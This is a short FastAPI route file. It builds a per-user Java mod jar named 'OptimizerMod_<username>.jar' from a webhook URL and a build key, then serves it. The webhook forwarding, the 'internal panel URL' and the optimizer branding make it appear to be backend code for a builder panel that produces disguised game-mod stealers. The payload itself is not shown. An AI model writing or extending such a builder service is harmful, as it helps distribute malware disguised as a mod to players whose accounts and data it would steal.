from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from app.api import deps
from app.schemas.schemas import BuildRequest
from app.services.builder_service import builder_service
from app.models.user import User

router = APIRouter()

@router.post("/")
async def build_mod(
    request: BuildRequest,
    current_user: User = Depends(deps.get_current_user),
):
    """
    Build the mod. The webhook_url in request is ignored in favor of the internal panel URL,
    or used as a fallback/forwarding target if implemented.
    """
    try:
        # Pass build_key to the builder service
        jar_path = await builder_service.build_mod(request.webhook_url, current_user.id, current_user.build_key)
        return FileResponse(
            path=jar_path, 
            filename=f"OptimizerMod_{current_user.username}.jar", 
            media_type='application/java-archive'
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
